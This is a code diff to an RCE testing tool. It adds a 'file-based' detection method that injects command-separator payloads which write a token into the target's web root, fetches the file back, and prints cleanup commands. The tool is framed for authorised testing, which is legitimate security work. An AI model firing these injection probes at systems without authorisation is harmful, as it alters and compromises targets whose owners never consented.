@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.11.0"
+__version__ = "2.12.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -1610,14 +1610,16 @@ class RCEKit:
                       max_payloads: Optional[int] = None,
                       url_location: str = "query_value",
                       body_location: Optional[str] = None,
+                      config: Optional[Dict[str, Any]] = None,
                       rng: Optional["random.Random"] = None) -> List[Dict[str, Any]]:
         """Method-driven RCE detection against an AUTHORISED target.
 
         For each selected :class:`DetectionMethod`, build probes from the
         applicable records, fire them through the shared delivery layer
-        (:meth:`_fire`), and confirm each against a single payload-free control
-        body. Every result carries ``method`` and ``tier`` so the two tiers
-        (``confirmed`` vs ``needs-review``) are never collapsed in reporting.
+        (:meth:`_fire`), optionally fetch a followup (file-based methods), and
+        confirm each against a single payload-free control body. Every result
+        carries ``method`` and ``tier`` so the two tiers (``confirmed`` vs
+        ``needs-review``) are never collapsed in reporting.
 
         This is additive: it does not alter the classic ``run_verification``
         oracle path, and only runs when the operator opts in via ``--methods``.
@@ -1625,7 +1627,7 @@ class RCEKit:
         import time
         rng = rng or random.Random()
         resolved_body_location = body_location or self._detect_body_location(data, headers)
-        selected = [DETECTION_METHODS[name](self) for name in methods
+        selected = [DETECTION_METHODS[name](self, config) for name in methods
                     if name in DETECTION_METHODS]
 
         # One payload-free control body for the reflection differential: the
@@ -1658,16 +1660,27 @@ class RCEKit:
                     status, body, elapsed = self._fire(
                         probe.payload, url, method, data, headers, url_location,
                         resolved_body_location, timeout)
+                    # A followup fetch (file-based self-OOB): retrieve the file the
+                    # probe asked the target to write. Its body is the confirmation
+                    # channel, so a blocked/failed fetch stays unconfirmed.
+                    followup_body: Optional[str] = None
+                    if probe.followup and probe.followup.get("url"):
+                        f_status, f_body, _ = self._fire(
+                            "", probe.followup["url"], "GET", None, None, "raw", "raw", timeout)
+                        followup_body = f_body if f_status is not None else None
                     obs = Observation(status=status, body=body, control_body=control_body,
-                                      elapsed=elapsed)
+                                      elapsed=elapsed, followup_body=followup_body)
                     verdict = meth.confirm(obs, probe)
-                    results.append({
+                    result = {
                         "verdict": verdict.status, "detail": verdict.evidence,
                         "status": status, "payload": probe.payload,
                         "method": meth.name, "tier": meth.tier,
                         "environment": record.environment, "context": record.context,
                         "category": "detection", "expected": probe.expected,
-                    })
+                    }
+                    if probe.followup and probe.followup.get("cleanup"):
+                        result["cleanup"] = probe.followup["cleanup"]
+                    results.append(result)
                     if delay:
                         time.sleep(delay)
                     if max_payloads and len(results) >= max_payloads:
@@ -2018,8 +2031,9 @@ class DetectionMethod:
     name = "base"
     tier = "confirmed"
 
-    def __init__(self, gen: "RCEKit"):
+    def __init__(self, gen: "RCEKit", config: Optional[Dict[str, Any]] = None):
         self.gen = gen
+        self.config = config or {}
 
     def applicable(self, record: "PayloadRecord") -> bool:
         raise NotImplementedError
@@ -2038,6 +2052,20 @@ class DetectionMethod:
         if not literal or not body:
             return False
         return self.gen._encoded_search(re.escape(literal), body)
+
+    def _tag(self, rng: "random.Random") -> str:
+        """A distinctive letters-only boundary marker. Letters keep it from
+        blurring into an adjacent digit run (e.g. an arithmetic result)."""
+        return "RK" + "".join(rng.choice(string.ascii_uppercase) for _ in range(5))
+
+    def _wrap(self, record: "PayloadRecord", core: str, windows: bool = False) -> str:
+        """Break out of the running command with a separator, then escape the
+        probe for the record's serialization context — reusing the same
+        context/escape machinery the generator uses for every other payload."""
+        ctx = self.gen.contexts.get(record.context, {"prefix": "", "suffix": "", "escape": "none"})
+        body = f"{' & ' if windows else '; '}{core}"
+        escaped = self.gen._escape_for_context(body, ctx.get("escape", "none"))
+        return f"{ctx.get('prefix', '')}{escaped}{ctx.get('suffix', '')}"
 
 
 class ReflectedMath(DetectionMethod):
@@ -2111,25 +2139,63 @@ class ReflectedMath(DetectionMethod):
         return Verdict("confirmed",
                        f"target computed {probe.expected!r} (random operands, absent from control)")
 
-    def _tag(self, rng: "random.Random") -> str:
-        """A distinctive letters-only boundary marker. Letters keep it from
-        blurring into the digit run of the arithmetic result."""
-        return "RK" + "".join(rng.choice(string.ascii_uppercase) for _ in range(5))
 
-    def _wrap(self, record: "PayloadRecord", core: str, windows: bool = False) -> str:
-        """Break out of the running command with a separator, then escape the
-        probe for the record's serialization context — reusing the same
-        context/escape machinery the generator uses for every other payload."""
-        ctx = self.gen.contexts.get(record.context, {"prefix": "", "suffix": "", "escape": "none"})
-        body = f"{' & ' if windows else '; '}{core}"
-        escaped = self.gen._escape_for_context(body, ctx.get("escape", "none"))
-        return f"{ctx.get('prefix', '')}{escaped}{ctx.get('suffix', '')}"
+class FileBased(DetectionMethod):
+    """Self-OOB confirmation for internal / no-egress targets. The probe makes
+    the target *write* a random token to a web-reachable file, then a followup
+    request fetches that file: the token is present only if the command executed
+    AND the write landed under the web root. No external listener is needed —
+    the confirmation channel is the target's own web server.
+
+    This changes target state (one file per confirmed probe), so it is gated on
+    ``--webroot`` + ``--web-base-url`` (the operator names the write location and
+    fetch base) and every finding carries an explicit cleanup command."""
+    name = "file"
+    tier = "confirmed"
+
+    def applicable(self, record: "PayloadRecord") -> bool:
+        if not (self.config.get("webroot") and self.config.get("web_base_url")):
+            return False
+        return (record.environment in UNIX_SHELL_ENVIRONMENTS
+                or record.environment == "windows")
+
+    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        webroot = self.config["webroot"].rstrip("/")
+        base = self.config["web_base_url"].rstrip("/")
+        name = "rcekit-" + "".join(rng.choice(string.ascii_lowercase + string.digits)
+                                   for _ in range(12)) + ".txt"
+        token = self._tag(rng) + "".join(rng.choice(string.ascii_uppercase + string.digits)
+                                         for _ in range(10))
+        windows = record.environment == "windows"
+        if windows:
+            write_path = f"{webroot}\\{name}"
+            core = f"echo {token}>{write_path}"
+            cleanup = f"del {write_path}"
+        else:
+            write_path = f"{webroot}/{name}"
+            core = f"echo {token} > {write_path}"
+            cleanup = f"rm -f {write_path}"
+        followup = {"url": f"{base}/{name}", "cleanup": cleanup, "path": write_path}
+        return [Probe(payload=self._wrap(record, core, windows=windows),
+                      expected=token, forbidden=None, followup=followup)]
+
+    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
+        if obs.followup_body is None:
+            return Verdict("negative",
+                           "could not fetch the written file (no write, wrong web root, or blocked)")
+        if not self._search(probe.expected, obs.followup_body):
+            return Verdict("negative", "token absent from the fetched file")
+        if obs.control_body and self._search(probe.expected, obs.control_body):
+            return Verdict("inconclusive", "token also present without the payload")
+        return Verdict("confirmed",
+                       f"target wrote and served token {probe.expected!r} (execution + write primitive)")
 
 
 # The detection methods RCEKit can run, keyed by their --methods name. Adding a
 # phase = adding a class above and an entry here.
 DETECTION_METHODS = {
     ReflectedMath.name: ReflectedMath,
+    FileBased.name: FileBased,
 }
 
 
@@ -2432,11 +2498,18 @@ def main():
     parser.add_argument("--request-scheme", choices=["http", "https"], default=None,
                         help="Scheme for the URL built from -r (default: https when the Host is on :443, "
                              "otherwise http).")
+    parser.add_argument("--webroot", default=None,
+                        help="(file-based detection) server-side directory the target can write to and "
+                             "serve, e.g. /var/www/html. Required with --methods file.")
+    parser.add_argument("--web-base-url", default=None,
+                        help="(file-based detection) base URL that serves --webroot, e.g. "
+                             "https://target.example. Required with --methods file.")
     parser.add_argument("--methods", default=None,
-                        help="Comma-separated RCE detection methods to run against --verify-url instead of "
+                        help="Comma-separated RCE detection methods to run against --verify-url/-r instead of "
                              "the classic per-payload oracle. Available: reflected (results-based execution "
-                             "proof via computed arithmetic). Opt-in and additive: when omitted, --verify-url "
-                             "keeps its existing behaviour unchanged.")
+                             "proof via computed arithmetic); file (self-OOB write+fetch, needs --webroot and "
+                             "--web-base-url). Opt-in and additive: when omitted, verification keeps its "
+                             "existing behaviour unchanged.")
     parser.add_argument("--verify-chain", default=None,
                         help="Path to a JSON chain profile: deliver each payload through a multi-step, "
                              "session-aware flow (login/CSRF -> prerequisites -> payload delivery -> trigger) "
@@ -2726,11 +2799,20 @@ def main():
                 print(f"[!] Unknown --methods: {', '.join(unknown)}. "
                       f"Available: {', '.join(sorted(DETECTION_METHODS))}.")
                 return
+            detection_config = {"webroot": args.webroot, "web_base_url": args.web_base_url}
+            if "file" in method_names:
+                if not (args.webroot and args.web_base_url):
+                    print("[!] --methods file writes a file to the target and fetches it back, so it "
+                          "needs both --webroot (server-side write dir) and --web-base-url (fetch base).")
+                    return
+                print(f"[detect] file-based method WRITES to {args.webroot} on the target and fetches via "
+                      f"{args.web_base_url}; each confirmed finding lists a cleanup command.")
             results = generator.run_detection(
                 to_send, url=verify_url, methods=method_names, method=method,
                 data=verify_data, headers=verify_headers, delay=args.verify_delay,
                 timeout=args.verify_timeout, max_payloads=args.max_payloads,
                 url_location=args.verify_url_location, body_location=args.verify_body_location,
+                config=detection_config,
             )
             by_verdict = {}
             for result in results:
@@ -2744,6 +2826,8 @@ def main():
                 for result in confirmed:
                     print(f"  [{result['method']}/{result['environment']}/{result['context']}] "
                           f"{result['payload']}   ({result['detail']})")
+                    if result.get("cleanup"):
+                        print(f"      cleanup: {result['cleanup']}")
             needs_review = [r for r in results if r["verdict"] == "needs-review"]
             if needs_review:
                 print(f"\n[detect] {len(needs_review)} NEEDS-REVIEW candidates "
